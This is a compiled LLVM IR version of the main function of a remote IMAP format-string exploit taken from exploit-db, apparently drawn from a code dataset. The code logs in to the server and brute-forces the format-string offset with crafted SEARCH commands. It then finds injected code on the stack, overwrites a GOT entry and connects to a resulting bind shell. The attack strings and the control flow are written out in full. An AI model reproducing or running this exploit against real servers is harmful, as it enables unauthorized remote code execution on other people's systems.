; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/bsd/remote/extr_1234.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/bsd/remote/extr_1234.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.hostent = type { i32, i32 }
%struct.sockaddr_in = type { i16, i32, %struct.TYPE_3__ }
%struct.TYPE_3__ = type { i32 }
%struct.sockaddr = type { i32 }

@EXIT_SUCCESS = common dso_local global i32 0, align 4
@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [37 x i8] c"exp.c:115 Could not allocate memory\0A\00", align 1
@EXIT_FAILURE = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [9 x i8] c"h:p:l:a:\00", align 1
@EOF = common dso_local global i32 0, align 4
@optarg = common dso_local global i64 0, align 8
@PF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@IPPROTO_TCP = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [39 x i8] c"exp.c:139 Error creating an new socket\00", align 1
@.str.3 = private unnamed_addr constant [10 x i8] c"localhost\00", align 1
@.str.4 = private unnamed_addr constant [40 x i8] c"exp.c:152 Could not resolve ip address\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@stdout = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [25 x i8] c"[+] Connecting to %s:%d\0A\00", align 1
@.str.6 = private unnamed_addr constant [33 x i8] c"[*] exp.c:178 Connection failed\0A\00", align 1
@.str.7 = private unnamed_addr constant [19 x i8] c"[+] Connected .. \0A\00", align 1
@.str.8 = private unnamed_addr constant [24 x i8] c"[+] Sending login ... \0A\00", align 1
@.str.9 = private unnamed_addr constant [16 x i8] c"1 LOGIN %s %s\0D\0A\00", align 1
@.str.10 = private unnamed_addr constant [15 x i8] c"[+] Done ... \0A\00", align 1
@.str.11 = private unnamed_addr constant [24 x i8] c"[+] Selecting inbox ..\0A\00", align 1
@.str.12 = private unnamed_addr constant [16 x i8] c"2 Select inbox\0A\00", align 1
@.str.13 = private unnamed_addr constant [47 x i8] c"[+] Selecting Done .. Starting brute sequence\0A\00", align 1
@.str.14 = private unnamed_addr constant [32 x i8] c"3 search topic .AAAABBBB%%%d$x\0A\00", align 1
@.str.15 = private unnamed_addr constant [6 x i8] c"(near\00", align 1
@.str.16 = private unnamed_addr constant [9 x i8] c"41414141\00", align 1
@.str.17 = private unnamed_addr constant [21 x i8] c"[+] Found offset %d\0A\00", align 1
@.str.18 = private unnamed_addr constant [33 x i8] c"[+] Finding buffer on the stack\0A\00", align 1
@code = common dso_local global i8* null, align 8
@got_entry = common dso_local global i32 0, align 4
@.str.19 = private unnamed_addr constant [23 x i8] c"[+] Decoy found at %p\0A\00", align 1
@.str.20 = private unnamed_addr constant [41 x i8] c"[+] Trying to contact the bind shell ..\0A\00", align 1
@.str.21 = private unnamed_addr constant [20 x i8] c"[-] Exploit failed\0A\00", align 1
@.str.22 = private unnamed_addr constant [36 x i8] c"3 search topic .%s....%%%d$s%sCCCC\0A\00", align 1
@.str.23 = private unnamed_addr constant [24 x i8] c"[+] Closing connection\0A\00", align 1
@.str.24 = private unnamed_addr constant [23 x i8] c"[-] Exploit failed %p\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca %struct.hostent*, align 8
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca [1030 x i8], align 16
  %9 = alloca i8*, align 8
  %10 = alloca [512 x i8], align 16
  %11 = alloca i8*, align 8
  %12 = alloca i8*, align 8
  %13 = alloca i8*, align 8
  %14 = alloca i8*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca { i64, i32 }, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %16, align 4
  store i32 1, i32* %18, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %21, align 4
  store i32 0, i32* %22, align 4
  store i32 0, i32* %23, align 4
  store i32 0, i32* %25, align 4
  store i32 134660096, i32* %26, align 4
  %28 = call i32 (...) @welcome()
  %29 = load i32, i32* %4, align 4
  %30 = icmp slt i32 %29, 9
  br i1 %30, label %31, label %37

31:                                               ; preds = %2
  %32 = load i32, i32* %4, align 4
  %33 = load i8**, i8*** %5, align 8
  %34 = call i32 @usage(i32 %32, i8** %33)
  %35 = load i32, i32* @EXIT_SUCCESS, align 4
  %36 = call i32 @exit(i32 %35) #4
  unreachable

37:                                               ; preds = %2
  %38 = call i8* @malloc(i32 128)
  store i8* %38, i8** %9, align 8
  %39 = icmp ne i8* %38, null
  br i1 %39, label %45, label %40

40:                                               ; preds = %37
  %41 = load i32, i32* @stderr, align 4
  %42 = call i32 (i32, i8*, ...) @fprintf(i32 %41, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str, i64 0, i64 0))
  %43 = load i32, i32* @EXIT_FAILURE, align 4
  %44 = call i32 @exit(i32 %43) #4
  unreachable

45:                                               ; preds = %37
  br label %46

46:                                               ; preds = %72, %45
  %47 = load i32, i32* %4, align 4
  %48 = load i8**, i8*** %5, align 8
  %49 = call i32 @getopt(i32 %47, i8** %48, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.1, i64 0, i64 0))
  store i32 %49, i32* %15, align 4
  %50 = load i32, i32* @EOF, align 4
  %51 = icmp ne i32 %49, %50
  br i1 %51, label %52, label %73

52:                                               ; preds = %46
  %53 = load i32, i32* %15, align 4
  switch i32 %53, label %68 [
    i32 104, label %54
    i32 86, label %58
    i32 112, label %59
    i32 108, label %62
    i32 97, label %65
  ]

54:                                               ; preds = %52
  %55 = load i64, i64* @optarg, align 8
  %56 = call i64 @strdup(i64 %55)
  %57 = inttoptr i64 %56 to i8*
  store i8* %57, i8** %9, align 8
  br label %72

58:                                               ; preds = %52
  br label %72

59:                                               ; preds = %52
  %60 = load i64, i64* @optarg, align 8
  %61 = call i32 @atoi(i64 %60)
  store i32 %61, i32* %16, align 4
  br label %72

62:                                               ; preds = %52
  %63 = load i64, i64* @optarg, align 8
  %64 = inttoptr i64 %63 to i8*
  store i8* %64, i8** %13, align 8
  br label %72

65:                                               ; preds = %52
  %66 = load i64, i64* @optarg, align 8
  %67 = inttoptr i64 %66 to i8*
  store i8* %67, i8** %14, align 8
  br label %72

68:                                               ; preds = %52
  %69 = load i32, i32* %4, align 4
  %70 = load i8**, i8*** %5, align 8
  %71 = call i32 @usage(i32 %69, i8** %70)
  br label %72

72:                                               ; preds = %68, %65, %62, %59, %58, %54
  br label %46

73:                                               ; preds = %46
  %74 = load i32, i32* @PF_INET, align 4
  %75 = load i32, i32* @SOCK_STREAM, align 4
  %76 = load i32, i32* @IPPROTO_TCP, align 4
  %77 = call i32 @socket(i32 %74, i32 %75, i32 %76)
  store i32 %77, i32* %17, align 4
  %78 = icmp slt i32 %77, 0
  br i1 %78, label %79, label %84

79:                                               ; preds = %73
  %80 = load i32, i32* @stderr, align 4
  %81 = call i32 (i32, i8*, ...) @fprintf(i32 %80, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.2, i64 0, i64 0))
  %82 = load i32, i32* @EXIT_FAILURE, align 4
  %83 = call i32 @exit(i32 %82) #4
  unreachable

84:                                               ; preds = %73
  %85 = load i8*, i8** %9, align 8
  %86 = icmp ne i8* %85, null
  br i1 %86, label %87, label %89

87:                                               ; preds = %84
  %88 = load i8*, i8** %9, align 8
  br label %90

89:                                               ; preds = %84
  br label %90

90:                                               ; preds = %89, %87
  %91 = phi i8* [ %88, %87 ], [ getelementptr inbounds ([10 x i8], [10 x i8]* @.str.3, i64 0, i64 0), %89 ]
  store i8* %91, i8** %9, align 8
  %92 = load i32, i32* %16, align 4
  %93 = icmp ne i32 %92, 0
  br i1 %93, label %94, label %96

94:                                               ; preds = %90
  %95 = load i32, i32* %16, align 4
  br label %97

96:                                               ; preds = %90
  br label %97

97:                                               ; preds = %96, %94
  %98 = phi i32 [ %95, %94 ], [ 143, %96 ]
  store i32 %98, i32* %16, align 4
  %99 = load i8*, i8** %9, align 8
  %100 = call i32 @ISIP(i8* %99)
  %101 = icmp ne i32 %100, 0
  br i1 %101, label %126, label %102

102:                                              ; preds = %97
  %103 = load i8*, i8** %9, align 8
  %104 = call %struct.hostent* @gethostbyname(i8* %103)
  store %struct.hostent* %104, %struct.hostent** %6, align 8
  %105 = icmp ne %struct.hostent* %104, null
  br i1 %105, label %111, label %106

106:                                              ; preds = %102
  %107 = load i32, i32* @stderr, align 4
  %108 = call i32 (i32, i8*, ...) @fprintf(i32 %107, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.4, i64 0, i64 0))
  %109 = load i32, i32* @EXIT_FAILURE, align 4
  %110 = call i32 @exit(i32 %109) #4
  unreachable

111:                                              ; preds = %102
  %112 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %113 = load %struct.hostent*, %struct.hostent** %6, align 8
  %114 = getelementptr inbounds %struct.hostent, %struct.hostent* %113, i32 0, i32 1
  %115 = load i32, i32* %114, align 4
  %116 = load %struct.hostent*, %struct.hostent** %6, align 8
  %117 = getelementptr inbounds %struct.hostent, %struct.hostent* %116, i32 0, i32 0
  %118 = load i32, i32* %117, align 4
  %119 = call i32 @memcpy(%struct.TYPE_3__* %112, i32 %115, i32 %118)
  %120 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %121 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %120, i32 0, i32 0
  %122 = load i32, i32* %121, align 4
  %123 = call i64 @inet_ntoa(i32 %122)
  %124 = call i64 @strdup(i64 %123)
  %125 = inttoptr i64 %124 to i8*
  store i8* %125, i8** %9, align 8
  br label %131

126:                                              ; preds = %97
  %127 = load i8*, i8** %9, align 8
  %128 = call i32 @inet_addr(i8* %127)
  %129 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %130 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %129, i32 0, i32 0
  store i32 %128, i32* %130, align 4
  br label %131

131:                                              ; preds = %126, %111
  %132 = load i32, i32* @AF_INET, align 4
  %133 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i32 %132, i32* %133, align 4
  %134 = load i32, i32* %16, align 4
  %135 = call i64 @htons(i32 %134)
  %136 = trunc i64 %135 to i16
  %137 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 %136, i16* %137, align 4
  %138 = load i32, i32* @stdout, align 4
  %139 = load i8*, i8** %9, align 8
  %140 = load i32, i32* %16, align 4
  %141 = call i32 (i32, i8*, ...) @fprintf(i32 %138, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.5, i64 0, i64 0), i8* %139, i32 %140)
  %142 = load i32, i32* %17, align 4
  %143 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %144 = call i64 @connect(i32 %142, %struct.sockaddr* %143, i32 4)
  %145 = icmp slt i64 %144, 0
  br i1 %145, label %146, label %151

146:                                              ; preds = %131
  %147 = load i32, i32* @stderr, align 4
  %148 = call i32 (i32, i8*, ...) @fprintf(i32 %147, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.6, i64 0, i64 0))
  %149 = load i32, i32* @EXIT_FAILURE, align 4
  %150 = call i32 @exit(i32 %149) #4
  unreachable

151:                                              ; preds = %131
  %152 = load i32, i32* @stdout, align 4
  %153 = call i32 (i32, i8*, ...) @fprintf(i32 %152, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.7, i64 0, i64 0))
  %154 = load i32, i32* @stdout, align 4
  %155 = call i32 (i32, i8*, ...) @fprintf(i32 %154, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.8, i64 0, i64 0))
  %156 = load i32, i32* %17, align 4
  %157 = load i8*, i8** %13, align 8
  %158 = load i8*, i8** %14, align 8
  %159 = call i32 (i32, i8*, ...) @send_message(i32 %156, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.9, i64 0, i64 0), i8* %157, i8* %158)
  %160 = load i32, i32* @stdout, align 4
  %161 = call i32 (i32, i8*, ...) @fprintf(i32 %160, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.10, i64 0, i64 0))
  br label %162

162:                                              ; preds = %338, %151
  %163 = load i32, i32* %17, align 4
  %164 = getelementptr inbounds [512 x i8], [512 x i8]* %10, i64 0, i64 0
  %165 = call i64 @read(i32 %163, i8* %164, i32 512)
  %166 = icmp sgt i64 %165, 0
  br i1 %166, label %167, label %341

167:                                              ; preds = %162
  %168 = load i32, i32* %19, align 4
  %169 = icmp eq i32 %168, 0
  br i1 %169, label %170, label %188

170:                                              ; preds = %167
  %171 = load i32, i32* %22, align 4
  %172 = icmp eq i32 %171, 0
  br i1 %172, label %173, label %188

173:                                              ; preds = %170
  %174 = getelementptr inbounds [512 x i8], [512 x i8]* %10, i64 0, i64 0
  %175 = load i8, i8* %174, align 16
  %176 = sext i8 %175 to i32
  switch i32 %176, label %187 [
    i32 49, label %177
  ]

177:                                              ; preds = %173
  %178 = load i32, i32* @stdout, align 4
  %179 = call i32 (i32, i8*, ...) @fprintf(i32 %178, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.11, i64 0, i64 0))
  %180 = load i32, i32* %17, align 4
  %181 = call i32 (i32, i8*, ...) @send_message(i32 %180, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.12, i64 0, i64 0))
  %182 = load i32, i32* @stdout, align 4
  %183 = call i32 (i32, i8*, ...) @fprintf(i32 %182, i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.13, i64 0, i64 0))
  %184 = load i32, i32* %17, align 4
  %185 = load i32, i32* %18, align 4
  %186 = call i32 (i32, i8*, ...) @send_message(i32 %184, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.14, i64 0, i64 0), i32 %185)
  store i32 1, i32* %19, align 4
  br label %187

187:                                              ; preds = %173, %177
  br label %188

188:                                              ; preds = %187, %170, %167
  %189 = getelementptr inbounds [512 x i8], [512 x i8]* %10, i64 0, i64 0
  %190 = call i8* @strstr(i8* %189, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.15, i64 0, i64 0))
  store i8* %190, i8** %11, align 8
  %191 = icmp ne i8* %190, null
  br i1 %191, label %192, label %216

192:                                              ; preds = %188
  %193 = load i32, i32* %19, align 4
  %194 = icmp eq i32 %193, 1
  br i1 %194, label %195, label %216

195:                                              ; preds = %192
  %196 = load i8*, i8** %11, align 8
  %197 = getelementptr inbounds i8, i8* %196, i64 15
  store i8* %197, i8** %11, align 8
  %198 = load i8*, i8** %11, align 8
  %199 = call i64 @strncmp(i8* %198, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.16, i64 0, i64 0), i32 8)
  %200 = icmp ne i64 %199, 0
  br i1 %200, label %201, label %207

201:                                              ; preds = %195
  %202 = load i32, i32* %18, align 4
  %203 = add nsw i32 %202, 1
  store i32 %203, i32* %18, align 4
  %204 = load i32, i32* %17, align 4
  %205 = load i32, i32* %18, align 4
  %206 = call i32 (i32, i8*, ...) @send_message(i32 %204, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.14, i64 0, i64 0), i32 %205)
  br label %215

207:                                              ; preds = %195
  %208 = load i32, i32* @stdout, align 4
  %209 = load i32, i32* %18, align 4
  %210 = call i32 (i32, i8*, ...) @fprintf(i32 %208, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.17, i64 0, i64 0), i32 %209)
  %211 = load i32, i32* @stdout, align 4
  %212 = call i32 (i32, i8*, ...) @fprintf(i32 %211, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.18, i64 0, i64 0))
  store i32 1, i32* %22, align 4
  store i32 0, i32* %19, align 4
  %213 = getelementptr inbounds [512 x i8], [512 x i8]* %10, i64 0, i64 0
  %214 = call i32 @clean(i8* %213)
  br label %215

215:                                              ; preds = %207, %201
  br label %216

216:                                              ; preds = %215, %192, %188
  %217 = load i32, i32* %22, align 4
  %218 = icmp eq i32 %217, 1
  br i1 %218, label %219, label %338

219:                                              ; preds = %216
  %220 = getelementptr inbounds [512 x i8], [512 x i8]* %10, i64 0, i64 0
  %221 = call i8* @strstr(i8* %220, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.15, i64 0, i64 0))
  store i8* %221, i8** %11, align 8
  %222 = icmp ne i8* %221, null
  br i1 %222, label %223, label %288

223:                                              ; preds = %219
  %224 = load i8*, i8** %11, align 8
  %225 = getelementptr inbounds i8, i8* %224, i64 11
  store i8* %225, i8** %11, align 8
  %226 = getelementptr inbounds [512 x i8], [512 x i8]* %10, i64 0, i64 0
  %227 = call i32 @strlen(i8* %226)
  %228 = load i8*, i8** %11, align 8
  %229 = call i32 @strlen(i8* %228)
  %230 = sub nsw i32 %227, %229
  store i32 %230, i32* %21, align 4
  %231 = load i32, i32* %21, align 4
  %232 = sub nsw i32 %231, 11
  store i32 %232, i32* %21, align 4
  store i32 0, i32* %20, align 4
  br label %233

233:                                              ; preds = %284, %223
  %234 = load i32, i32* %20, align 4
  %235 = getelementptr inbounds [512 x i8], [512 x i8]* %10, i64 0, i64 0
  %236 = call i32 @strlen(i8* %235)
  %237 = icmp slt i32 %234, %236
  br i1 %237, label %238, label %287

238:                                              ; preds = %233
  %239 = load i8*, i8** %11, align 8
  %240 = load i8*, i8** @code, align 8
  %241 = load i8*, i8** @code, align 8
  %242 = call i32 @strlen(i8* %241)
  %243 = call i64 @strncmp(i8* %239, i8* %240, i32 %242)
  %244 = icmp eq i64 %243, 0
  br i1 %244, label %245, label %280

245:                                              ; preds = %238
  %246 = load i32, i32* %25, align 4
  %247 = icmp ne i32 %246, 1
  br i1 %247, label %248, label %280

248:                                              ; preds = %245
  %249 = load i32, i32* %20, align 4
  %250 = sub nsw i32 %249, 4
  %251 = load i32, i32* %26, align 4
  %252 = add i32 %251, %250
  store i32 %252, i32* %26, align 4
  store i32 1, i32* %25, align 4
  %253 = call i32 @sleep(i32 2)
  %254 = load i32, i32* @got_entry, align 4
  %255 = load i32, i32* %26, align 4
  %256 = add i32 %255, 3
  store i32 %256, i32* %26, align 4
  %257 = load i32, i32* %18, align 4
  %258 = load i32, i32* %17, align 4
  %259 = call i32 @buildstring(i32 %254, i32 %256, i32 %257, i32 %258)
  %260 = load i32, i32* @stdout, align 4
  %261 = load i32, i32* %26, align 4
  %262 = call i32 (i32, i8*, ...) @fprintf(i32 %260, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.19, i64 0, i64 0), i32 %261)
  %263 = load i32, i32* %17, align 4
  %264 = call i32 @close(i32 %263)
  %265 = load i32, i32* @stdout, align 4
  %266 = call i32 (i32, i8*, ...) @fprintf(i32 %265, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.20, i64 0, i64 0))
  %267 = load i8*, i8** %9, align 8
  %268 = bitcast { i64, i32 }* %27 to i8*
  %269 = bitcast %struct.sockaddr_in* %7 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 4 %268, i8* align 4 %269, i64 12, i1 false)
  %270 = getelementptr inbounds { i64, i32 }, { i64, i32 }* %27, i32 0, i32 0
  %271 = load i64, i64* %270, align 4
  %272 = getelementptr inbounds { i64, i32 }, { i64, i32 }* %27, i32 0, i32 1
  %273 = load i32, i32* %272, align 4
  %274 = call i64 @comun(i8* %267, i64 %271, i32 %273)
  %275 = icmp slt i64 %274, 0
  br i1 %275, label %276, label %279

276:                                              ; preds = %248
  %277 = load i32, i32* @stderr, align 4
  %278 = call i32 (i32, i8*, ...) @fprintf(i32 %277, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.21, i64 0, i64 0))
  br label %279

279:                                              ; preds = %276, %248
  br label %283

280:                                              ; preds = %245, %238
  %281 = load i8*, i8** %11, align 8
  %282 = getelementptr inbounds i8, i8* %281, i32 1
  store i8* %282, i8** %11, align 8
  br label %283

283:                                              ; preds = %280, %279
  br label %284

284:                                              ; preds = %283
  %285 = load i32, i32* %20, align 4
  %286 = add nsw i32 %285, 1
  store i32 %286, i32* %20, align 4
  br label %233

287:                                              ; preds = %233
  br label %288

288:                                              ; preds = %287, %219
  %289 = load i32, i32* %26, align 4
  %290 = icmp ugt i32 %289, -1073741824
  br i1 %290, label %291, label %292

291:                                              ; preds = %288
  br label %341

292:                                              ; preds = %288
  %293 = load i32, i32* %26, align 4
  %294 = add i32 %293, 1
  store i32 %294, i32* %26, align 4
  %295 = bitcast i32* %26 to i8*
  store i8* %295, i8** %11, align 8
  %296 = load i8*, i8** %11, align 8
  %297 = getelementptr inbounds i8, i8* %296, i64 4
  store i8 0, i8* %297, align 1
  %298 = load i8*, i8** %11, align 8
  %299 = call i64 @strchr(i8* %298, i32 10)
  %300 = icmp ne i64 %299, 0
  br i1 %300, label %311, label %301

301:                                              ; preds = %292
  %302 = load i8*, i8** %11, align 8
  %303 = call i64 @strchr(i8* %302, i32 13)
  %304 = icmp ne i64 %303, 0
  br i1 %304, label %311, label %305

305:                                              ; preds = %301
  %306 = load i8*, i8** %11, align 8
  %307 = getelementptr inbounds i8, i8* %306, i64 0
  %308 = load i8, i8* %307, align 1
  %309 = sext i8 %308 to i32
  %310 = icmp eq i32 %309, 0
  br i1 %310, label %311, label %317

311:                                              ; preds = %305, %301, %292
  %312 = load i32, i32* %26, align 4
  %313 = add i32 %312, 1
  store i32 %313, i32* %26, align 4
  %314 = bitcast i32* %26 to i8*
  store i8* %314, i8** %11, align 8
  %315 = load i8*, i8** %11, align 8
  %316 = getelementptr inbounds i8, i8* %315, i64 4
  store i8 0, i8* %316, align 1
  br label %317

317:                                              ; preds = %311, %305
  br label %318

318:                                              ; preds = %322, %317
  %319 = load i8*, i8** %11, align 8
  %320 = call i32 @strlen(i8* %319)
  %321 = icmp ne i32 %320, 4
  br i1 %321, label %322, label %328

322:                                              ; preds = %318
  %323 = load i32, i32* %26, align 4
  %324 = add i32 %323, 1
  store i32 %324, i32* %26, align 4
  %325 = bitcast i32* %26 to i8*
  store i8* %325, i8** %11, align 8
  %326 = load i8*, i8** %11, align 8
  %327 = getelementptr inbounds i8, i8* %326, i64 4
  store i8 0, i8* %327, align 1
  br label %318

328:                                              ; preds = %318
  %329 = load i32, i32* %25, align 4
  %330 = icmp ne i32 %329, 1
  br i1 %330, label %331, label %337

331:                                              ; preds = %328
  %332 = load i32, i32* %17, align 4
  %333 = load i8*, i8** %11, align 8
  %334 = load i32, i32* %18, align 4
  %335 = load i8*, i8** @code, align 8
  %336 = call i32 (i32, i8*, ...) @send_message(i32 %332, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.22, i64 0, i64 0), i8* %333, i32 %334, i8* %335)
  br label %337

337:                                              ; preds = %331, %328
  br label %338

338:                                              ; preds = %337, %216
  %339 = getelementptr inbounds [512 x i8], [512 x i8]* %10, i64 0, i64 0
  %340 = call i32 @clean(i8* %339)
  br label %162

341:                                              ; preds = %291, %162
  %342 = load i32, i32* @stderr, align 4
  %343 = call i32 (i32, i8*, ...) @fprintf(i32 %342, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.23, i64 0, i64 0))
  %344 = load i32, i32* %17, align 4
  %345 = call i32 @close(i32 %344)
  %346 = load i8*, i8** %9, align 8
  %347 = call i32 @free(i8* %346)
  %348 = load i32, i32* @stderr, align 4
  %349 = load i32, i32* %26, align 4
  %350 = call i32 (i32, i8*, ...) @fprintf(i32 %348, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.24, i64 0, i64 0), i32 %349)
  ret i32 0
}

declare dso_local i32 @welcome(...) #1

declare dso_local i32 @usage(i32, i8**) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i8* @malloc(i32) #1

declare dso_local i32 @fprintf(i32, i8*, ...) #1

declare dso_local i32 @getopt(i32, i8**, i8*) #1

declare dso_local i64 @strdup(i64) #1

declare dso_local i32 @atoi(i64) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @ISIP(i8*) #1

declare dso_local %struct.hostent* @gethostbyname(i8*) #1

declare dso_local i32 @memcpy(%struct.TYPE_3__*, i32, i32) #1

declare dso_local i64 @inet_ntoa(i32) #1

declare dso_local i32 @inet_addr(i8*) #1

declare dso_local i64 @htons(i32) #1

declare dso_local i64 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @send_message(i32, i8*, ...) #1

declare dso_local i64 @read(i32, i8*, i32) #1

declare dso_local i8* @strstr(i8*, i8*) #1

declare dso_local i64 @strncmp(i8*, i8*, i32) #1

declare dso_local i32 @clean(i8*) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @buildstring(i32, i32, i32, i32) #1

declare dso_local i32 @close(i32) #1

declare dso_local i64 @comun(i8*, i64, i32) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #3

declare dso_local i64 @strchr(i8*, i32) #1

declare dso_local i32 @free(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { argmemonly nounwind willreturn }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
